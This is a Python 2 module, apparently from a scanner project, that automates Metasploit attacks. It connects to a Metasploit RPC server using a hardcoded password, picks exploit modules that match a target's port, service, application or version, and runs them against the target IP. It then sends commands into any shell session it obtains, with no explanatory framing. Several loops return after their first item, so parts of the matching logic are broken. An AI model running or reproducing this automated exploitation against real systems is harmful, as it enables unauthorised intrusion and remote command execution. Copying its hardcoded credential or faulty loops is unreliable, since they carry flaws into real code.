# coding=utf-8
import re
import time
from aquaman.lib.metasploit.msfrpc import MsfRpcClient
from aquaman.lib.mongo_db import db_name_conf, connectiondb
from utils.public import port_service

try:
    client = MsfRpcClient('mypassword', server='172.31.50.156', port=55553)
    exploit_db = db_name_conf()['exploit_db']
except Exception:
    print "[Warning] MsfRpcClient connect timeout..."


class MsfScanner:
    def __init__(self, ip=None, service=None, port=None, app=None, version=None):
        self.ip = ip
        self.service = service
        self.app = app
        self.port = port
        self.version = version

    def get_info(self, m_name):
        """
        return: dict
        """
        exploit = client.modules.use('exploit', m_name)
        _info = exploit._info
        tags = ''
        if len(_info['references']) > 0:
            tags = '-'.join(_info['references'][0])
        return {
            'name': _info['name'],
            'description': _info['description'],
            'type': _info['type'],
            'tags': tags,
            'filepath': _info['filepath'],
        }

    def get_exploit(self, info):
        """
        return: list
        """
        array = client.modules.exploits
        if not info:
            return array

        result = []
        for item in array:
            if info in item:
                result.append(item)
        return result

    # 清空旧Sessions
    def _kill_sessions(self):
        for i in client.sessions.list.keys():
            client.sessions.kill(i)

    def _match_exploit(self):
        """
        [+] 实例端口信息 匹配漏洞
        [*] 因为采用nmap扫端口服务，基本就只有类似ssh、mysql等service
        [*] 所以以下代码主要是1.2起作用
        [*] 先匹配Metasploit, 后期匹配Poc Python插件
        [-] 输出系统模块，还需要跟数据库进行匹配payload和cmd等require信息
        """
        array = client.modules.exploits
        result = []
        # 0.先看看是否扫出端口对应的服务
        if not self.service:
            self.service = port_service(self.port)['service']
            if not self.service:  # 没有匹配到默认的端口服务, 都不知道是啥服务，取消攻击
                return result
            # 0.1 执行默认服务攻击
            for item in array:
                if self.service in item:
                    result.append(item)
                return result

        # 1.有服务
        # 1.1 看看是否有具体应用名
        if self.app:
            # 1.1.1 看看是否有版本号
            if self.version:
                # 执行对应应用的版本号攻击
                version = self.version
                version = version.replace('.', '')
                for item in array:
                    if self.app in item and version in item:
                        result.append(item)
                    return result
            else:
                # 执行应用攻击
                for item in array:
                    if self.app in item:
                        result.append(item)
                    return result

        # 1.2 只识别出服务协议: ftp、ssh等
        else:
            # 1.2.1 执行批量该服务攻击
            for item in array:
                if self.service in item:
                    result.append(item)
            return result

    def _match_require(self):
        """
        [+] 匹配Mongo数据库的动作关联库
        [-] 输出攻击的所有的require准备
        """
        result = []
        array = self._match_exploit()
        for item in array:
            resp = connectiondb(exploit_db).find_one({"exploit": re.compile(item)})
            if not resp:
                continue
            print "resp,", resp
            result.append({
                "vt_name": resp['vt_name'], "exploit": resp['exploit'], "payload": resp['payload'],
                "cmd": resp['cmd'], "desc": resp['desc']
            })
        return result

    # session交互
    def _communicate_session(self, session_id, cmd):
        shell = client.sessions.session(session_id)
        if '\n' not in cmd:
            cmd = "%s\n" % cmd
        shell.write(cmd)
        content = shell.read()
        return content.replace(' ', '')

    def _attack(self):
        result = []
        array = self._match_require()
        for item in array:
            print '[*] Execute exploit(%s) attack now.' % item['exploit']
            attacker = client.modules.use('exploit', item['exploit'])
            attrs = attacker.required
            if 'RHOSTS' in attrs:
                attacker['RHOSTS'] = self.ip
            if 'RPORT' in attrs:
                attacker['RPORT'] = self.port
            attacker['VERBOSE'] = True
            self._kill_sessions()
            for _ in range(10):
                attacker.execute(payload=item['payload'])
                temp = client.sessions.list
                if len(temp) != 0:
                    s_id = temp.keys()[0]
                    content = self._communicate_session(s_id, item['cmd'])
                    result.append({
                        "vt_name": item['vt_name'], "exploit": item['exploit'], "payload": item['payload'],
                        "cmd": item['cmd'], "desc": item['desc'], "verify": content
                    })
                    break
                print '[*] The vulnerability(%s) may have failed.' % item['exploit']
                time.sleep(1)
        print "[-] MsfScanner._attack ", result
        return result

    def run(self):
        """
        [+] 对一个端口对应的服务的攻击、存库
        [*] 没有处理session不可以进行多线程攻击
        [-] return array ;返回该攻击结果
        """
        return self._attack()
